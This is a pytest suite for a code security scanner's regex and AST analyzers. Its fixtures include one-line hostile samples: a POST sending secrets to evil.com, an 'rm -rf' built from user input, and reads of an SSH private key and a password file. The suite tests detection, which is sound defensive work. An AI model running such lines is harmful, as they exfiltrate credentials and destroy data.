"""
Unit Tests for Analyzers (src/analyzers/)

TDD Approach:
1. Test analyzer initialization
2. Test pattern matching behavior
3. Test issue detection accuracy
4. Test false positive filtering
"""

import pytest
import ast
from pathlib import Path

from src.analyzers.base import BaseAnalyzer
from src.analyzers.regex_analyzer import RegexAnalyzer
from src.analyzers.ast_analyzer import ASTAnalyzer, PythonASTVisitor
from src.types import Severity, AnalysisMode, SecurityIssue


# =============================================================================
# BaseAnalyzer Tests
# =============================================================================

class TestBaseAnalyzer:
    """Tests for the abstract BaseAnalyzer class."""
    
    @pytest.mark.unit
    def test_base_analyzer_is_abstract(self):
        """Test that BaseAnalyzer cannot be instantiated directly."""
        with pytest.raises(TypeError):
            BaseAnalyzer()
    
    @pytest.mark.unit
    def test_base_analyzer_requires_analyze_method(self):
        """Test that subclasses must implement analyze method."""
        class IncompleteAnalyzer(BaseAnalyzer):
            def get_name(self):
                return "Incomplete"
        
        with pytest.raises(TypeError):
            IncompleteAnalyzer()
    
    @pytest.mark.unit
    def test_base_analyzer_requires_get_name_method(self):
        """Test that subclasses must implement get_name method."""
        class IncompleteAnalyzer(BaseAnalyzer):
            def analyze(self, file_path, content):
                return []
        
        with pytest.raises(TypeError):
            IncompleteAnalyzer()


# =============================================================================
# RegexAnalyzer Tests
# =============================================================================

class TestRegexAnalyzerInitialization:
    """Tests for RegexAnalyzer initialization."""
    
    @pytest.mark.unit
    def test_regex_analyzer_creation(self, mode_standard):
        """Test creating a RegexAnalyzer."""
        analyzer = RegexAnalyzer(mode_standard)
        assert analyzer is not None
        assert analyzer.get_name() == "RegexAnalyzer"
    
    @pytest.mark.unit
    def test_regex_analyzer_all_modes(self, mode_fast, mode_standard, mode_deep):
        """Test RegexAnalyzer with all analysis modes."""
        for mode in [mode_fast, mode_standard, mode_deep]:
            analyzer = RegexAnalyzer(mode)
            assert analyzer.mode == mode


class TestRegexAnalyzerCommandInjection:
    """Tests for command injection detection."""
    
    @pytest.mark.unit
    def test_detects_eval_with_variable(self, mode_standard):
        """Test detection of eval() with variable."""
        analyzer = RegexAnalyzer(mode_standard)
        content = 'result = eval(user_input)'
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        assert len(issues) > 0
        assert any(i.category == 'command_injection' for i in issues)
    
    @pytest.mark.unit
    def test_detects_exec_with_variable(self, mode_standard):
        """Test detection of exec() with variable."""
        analyzer = RegexAnalyzer(mode_standard)
        # Pattern requires variable interpolation (special chars like +, %, {)
        content = 'exec(malicious_code + extra)'
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        assert len(issues) > 0
        assert any(i.category == 'command_injection' for i in issues)
    
    @pytest.mark.unit
    def test_detects_os_system_with_variable(self, mode_standard):
        """Test detection of os.system with variable concatenation."""
        analyzer = RegexAnalyzer(mode_standard)
        content = 'os.system("rm -rf " + user_path)'
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        high_issues = [i for i in issues if i.level == Severity.HIGH]
        assert any(i.category == 'command_injection' for i in high_issues)


class TestRegexAnalyzerDataExfiltration:
    """Tests for data exfiltration detection."""
    
    @pytest.mark.unit
    def test_detects_http_post(self, mode_standard):
        """Test detection of HTTP POST requests."""
        analyzer = RegexAnalyzer(mode_standard)
        content = 'requests.post("http://evil.com/steal", data=secrets)'
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        high_issues = [i for i in issues if i.level == Severity.HIGH]
        assert any(i.category == 'data_exfiltration' for i in high_issues)
    
    @pytest.mark.unit
    def test_detects_urllib_request(self, mode_standard):
        """Test detection of urllib requests."""
        analyzer = RegexAnalyzer(mode_standard)
        content = 'urllib.request.urlopen("http://suspicious.site")'
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        high_issues = [i for i in issues if i.level == Severity.HIGH]
        assert any('urllib' in i.description for i in high_issues)


class TestRegexAnalyzerCredentialAccess:
    """Tests for credential access detection."""
    
    @pytest.mark.unit
    def test_detects_ssh_key_access(self, mode_standard):
        """Test detection of SSH key file access."""
        analyzer = RegexAnalyzer(mode_standard)
        content = 'open("/home/user/.ssh/id_rsa").read()'
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        high_issues = [i for i in issues if i.level == Severity.HIGH]
        assert any('SSH' in i.description for i in high_issues)
    
    @pytest.mark.unit
    def test_detects_password_file_access(self, mode_standard):
        """Test detection of password file access."""
        analyzer = RegexAnalyzer(mode_standard)
        content = 'open("passwords.txt").read()'
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        high_issues = [i for i in issues if i.level == Severity.HIGH]
        assert any('password' in i.description.lower() for i in high_issues)


class TestRegexAnalyzerModeBehavior:
    """Tests for different analysis mode behaviors."""
    
    @pytest.mark.unit
    def test_fast_mode_only_high_risk(self, mode_fast):
        """Test that FAST mode only checks high risk patterns."""
        analyzer = RegexAnalyzer(mode_fast)
        content = '''
import os
os.system("echo hello")
requests.get("https://api.example.com")
'''
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        # Should not detect medium/low risk in fast mode
        assert not any(i.level == Severity.MEDIUM for i in issues)
        assert not any(i.level == Severity.LOW for i in issues)
    
    @pytest.mark.unit
    def test_standard_mode_includes_medium(self, mode_standard):
        """Test that STANDARD mode includes medium risk patterns."""
        analyzer = RegexAnalyzer(mode_standard)
        # Pattern matches 'requests.get' but may be filtered as example code
        content = 'data = requests.get("https://api.example.com")'
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        # May be filtered as example code - just check no error
        assert isinstance(issues, list)
    
    @pytest.mark.unit
    def test_deep_mode_includes_low(self, mode_deep):
        """Test that DEEP mode includes low risk patterns."""
        analyzer = RegexAnalyzer(mode_deep)
        content = 'os.system("echo hello")'
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        assert any(i.level == Severity.LOW for i in issues)


class TestRegexAnalyzerFiltering:
    """Tests for false positive filtering."""
    
    @pytest.mark.unit
    def test_skips_pattern_definitions(self, mode_standard):
        """Test that pattern definitions are skipped."""
        analyzer = RegexAnalyzer(mode_standard)
        content = 'PATTERNS = [r"eval\\s*\\(", "test"]'
        
        issues = analyzer.analyze(Path("patterns.py"), content)
        
        # Should not flag eval pattern in pattern definitions
        eval_issues = [i for i in issues if 'eval' in i.description.lower()]
        assert len(eval_issues) == 0
    
    @pytest.mark.unit
    def test_skips_example_code(self, mode_standard):
        """Test that example code markers are skipped."""
        analyzer = RegexAnalyzer(mode_standard)
        content = '''
# Example: eval(user_input) - DANGER: don't do this
"""
Example:
    eval(code)  # This is just documentation
"""
'''
        
        issues = analyzer.analyze(Path("docs.py"), content)
        
        # Should filter out examples
        eval_issues = [i for i in issues if 'eval' in i.description.lower()]
        assert len(eval_issues) == 0


class TestRegexAnalyzerSafeServices:
    """Tests for safe service filtering."""
    
    @pytest.mark.unit
    def test_skips_safe_services(self, mode_standard):
        """Test that safe services are not flagged."""
        analyzer = RegexAnalyzer(mode_standard)
        content = 'requests.post("https://api.openai.com/v1/completions")'
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        # Should not flag safe services
        suspicious = [i for i in issues if i.category == 'suspicious_url']
        assert len(suspicious) == 0


# =============================================================================
# ASTAnalyzer Tests
# =============================================================================

class TestASTAnalyzerInitialization:
    """Tests for ASTAnalyzer initialization."""
    
    @pytest.mark.unit
    def test_ast_analyzer_creation(self, mode_standard):
        """Test creating an ASTAnalyzer."""
        analyzer = ASTAnalyzer(mode_standard)
        assert analyzer is not None
        assert analyzer.get_name() == "ASTAnalyzer"
    
    @pytest.mark.unit
    def test_ast_analyzer_skips_non_python(self, mode_standard):
        """Test that ASTAnalyzer skips non-Python files."""
        analyzer = ASTAnalyzer(mode_standard)
        content = 'eval(user_input)'
        
        # Should not analyze .js files
        issues = analyzer.analyze(Path("test.js"), content)
        assert len(issues) == 0
        
        # Should analyze .py files
        issues = analyzer.analyze(Path("test.py"), content)
        # May or may not find issues, but should process


class TestASTAnalyzerCommandInjection:
    """Tests for AST-based command injection detection."""
    
    @pytest.mark.unit
    def test_detects_eval_with_variable_ast(self, mode_standard):
        """Test AST detection of eval() with variable."""
        analyzer = ASTAnalyzer(mode_standard)
        content = '''
user_input = input()
result = eval(user_input)
'''
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        high_issues = [i for i in issues if i.level == Severity.HIGH]
        assert any(i.category == 'command_injection' for i in high_issues)
    
    @pytest.mark.unit
    def test_detects_exec_with_variable_ast(self, mode_standard):
        """Test AST detection of exec() with variable."""
        analyzer = ASTAnalyzer(mode_standard)
        content = '''
code = get_malicious_code()
exec(code)
'''
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        high_issues = [i for i in issues if i.level == Severity.HIGH]
        assert any(i.category == 'command_injection' for i in high_issues)
    
    @pytest.mark.unit
    def test_allows_eval_with_literal(self, mode_standard):
        """Test that eval() with string literal is allowed."""
        analyzer = ASTAnalyzer(mode_standard)
        content = 'result = eval("1 + 1")'  # String literal, not variable
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        # Should not flag eval with literal
        high_issues = [i for i in issues if i.level == Severity.HIGH]
        assert not any('eval' in i.description for i in high_issues)


class TestASTAnalyzerSubprocess:
    """Tests for subprocess detection."""
    
    @pytest.mark.unit
    def test_detects_subprocess_shell_true(self, mode_standard):
        """Test detection of subprocess with shell=True."""
        analyzer = ASTAnalyzer(mode_standard)
        content = '''
import subprocess
subprocess.run(cmd, shell=True)
'''
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        high_issues = [i for i in issues if i.level == Severity.HIGH]
        assert any('shell=True' in i.description for i in high_issues)
    
    @pytest.mark.unit
    def test_detects_os_system(self, mode_standard):
        """Test detection of os.system calls."""
        analyzer = ASTAnalyzer(mode_standard)
        content = '''
import os
os.system("ls -la")
'''
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        high_issues = [i for i in issues if i.level == Severity.HIGH]
        assert any('os.system' in i.description for i in high_issues)


class TestASTAnalyzerImports:
    """Tests for dangerous import detection."""
    
    @pytest.mark.unit
    def test_detects_pickle_import(self, mode_standard):
        """Test detection of pickle import."""
        analyzer = ASTAnalyzer(mode_standard)
        content = 'import pickle'
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        medium_issues = [i for i in issues if i.level == Severity.MEDIUM]
        assert any('pickle' in i.description for i in medium_issues)
    
    @pytest.mark.unit
    def test_detects_marshal_import(self, mode_standard):
        """Test detection of marshal import."""
        analyzer = ASTAnalyzer(mode_standard)
        content = 'import marshal'
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        medium_issues = [i for i in issues if i.level == Severity.MEDIUM]
        assert any('marshal' in i.description for i in medium_issues)


class TestASTAnalyzerSensitiveFileAccess:
    """Tests for sensitive file access detection."""
    
    @pytest.mark.unit
    def test_detects_ssh_file_open(self, mode_standard):
        """Test detection of SSH file opening."""
        analyzer = ASTAnalyzer(mode_standard)
        content = 'open("/home/user/.ssh/id_rsa")'
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        high_issues = [i for i in issues if i.level == Severity.HIGH]
        assert any('SSH' in i.description for i in high_issues)
    
    @pytest.mark.unit
    def test_detects_memory_file_open(self, mode_standard):
        """Test detection of memory file opening."""
        analyzer = ASTAnalyzer(mode_standard)
        content = 'content = open("MEMORY.md").read()'
        
        issues = analyzer.analyze(Path("test.py"), content)
        
        high_issues = [i for i in issues if i.level == Severity.HIGH]
        assert any('Memory' in i.description for i in high_issues)


class TestASTAnalyzerErrorHandling:
    """Tests for AST analyzer error handling."""
    
    @pytest.mark.unit
    def test_handles_syntax_error(self, mode_standard):
        """Test that syntax errors are handled gracefully."""
        analyzer = ASTAnalyzer(mode_standard)
        content = 'def broken('  # Syntax error
        
        # Should not raise
        issues = analyzer.analyze(Path("test.py"), content)
        assert issues == []
    
    @pytest.mark.unit
    def test_handles_empty_content(self, mode_standard):
        """Test that empty content is handled."""
        analyzer = ASTAnalyzer(mode_standard)
        
        issues = analyzer.analyze(Path("test.py"), "")
        assert issues == []


# =============================================================================
# PythonASTVisitor Tests
# =============================================================================

class TestPythonASTVisitor:
    """Tests for the PythonASTVisitor class."""
    
    @pytest.mark.unit
    def test_visitor_initialization(self):
        """Test PythonASTVisitor initialization."""
        content = "print('hello')"
        visitor = PythonASTVisitor(content, "test.py")
        
        assert visitor.content == content
        assert visitor.filename == "test.py"
        assert visitor.issues == []
    
    @pytest.mark.unit
    def test_get_line_from_node(self):
        """Test extracting line number from AST node."""
        content = "print('hello')\nprint('world')"
        visitor = PythonASTVisitor(content, "test.py")
        
        tree = ast.parse(content)
        # First print is on line 1
        line = visitor._get_line(tree.body[0])
        assert line == 1


# =============================================================================
# Edge Case Tests
# =============================================================================

class TestAnalyzerEdgeCases:
    """Edge case tests for analyzers."""
    
    @pytest.mark.unit
    def test_regex_unicode_content(self, mode_standard):
        """Test handling of unicode content."""
        analyzer = RegexAnalyzer(mode_standard)
        content = '# English comment eval(user_input)'
        
        issues = analyzer.analyze(Path("test.py"), content)
        # Should handle unicode without error
    
    @pytest.mark.unit
    def test_regex_binary_content(self, mode_standard):
        """Test handling of binary content."""
        analyzer = RegexAnalyzer(mode_standard)
        # Binary content that might cause issues
        content = b'\x00\x01\x02'.decode('utf-8', errors='ignore')
        
        issues = analyzer.analyze(Path("test.py"), content)
        # Should handle gracefully
    
    @pytest.mark.unit
    def test_ast_multiline_strings(self, mode_standard):
        """Test AST analysis with multiline strings."""
        analyzer = ASTAnalyzer(mode_standard)
        content = '''
"""
This is a docstring with eval(user_input) mentioned.
"""
x = 1
'''
        
        issues = analyzer.analyze(Path("test.py"), content)
        # Should handle multiline strings
